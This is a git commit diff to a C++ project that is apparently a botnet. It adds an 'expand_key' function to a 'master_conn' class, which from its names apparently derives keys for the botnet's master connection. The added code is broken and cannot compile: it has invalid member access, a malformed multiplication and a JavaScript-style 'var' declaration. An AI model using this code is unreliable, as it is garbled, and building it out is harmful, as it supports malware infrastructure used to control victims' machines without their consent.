2c8954cea9c69d4120dee2513a5a942f3fdb2e4c
vitorlima <vitor_lp@yahoo.com>
2014-12-07 15:36:15 -0200

    Criei método para expandir a chave (um hash)
    master_conn::expand_key

--- src/master_conn.cpp
+++ src/master_conn.cpp
@@ -5,6 +5,7 @@
 #include "master_conn.h"
 
 namespace botnet{
+
     int master_conn::keyGen() {
         SYSTEMTIME lt;
         int day = 0;
@@ -19,4 +20,26 @@ namespace botnet{
         key = base ^ r;
         return key;
     }
+
+
+	std::string master_conn::expand_key (std::string str_key){
+  		const std::string ALPHA = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+		const int ALPHA_SIZE = ALPHA.length(); 
+  
+		std::string exp_key = "";
+	    int n = str_key.length();
+		int i = 0;
+		int index;
+	    for (i = 0; i < n/2; i++){
+			exp_key = exp_key
+		               + ALPHA[((int)str_key[i] + (int)str_key.[i+1]) % ALPHA_SIZE]
+		               + ALPHA[(((int)str_key[i]) * 6((int)str_key[n-i-1])) % ALPHA_SIZE];
+		}
+	    for (var i = 0; i < n; i++){
+			index = (((int)ALPHA[((int)str_key[i]) % ALPHA_SIZE]) + i*i ) % ALPHA_SIZE;
+			exp_key = exp_key + ALPHA[index];
+		}
+		return exp_key;
+	}
+
 }
